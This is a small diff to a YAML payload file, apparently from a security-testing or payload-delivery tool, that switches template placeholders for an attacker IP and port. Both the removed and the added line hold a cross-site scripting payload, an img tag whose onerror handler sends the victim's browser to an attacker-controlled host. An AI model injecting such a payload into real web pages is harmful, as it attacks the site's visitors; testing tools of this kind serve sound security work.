@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  <img src=x onerror="document.location='http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/test'"/>
+  <img src=x onerror="document.location='http://{{ attacker_ip }}:{{ delivery_outbound_port }}/test'"/>
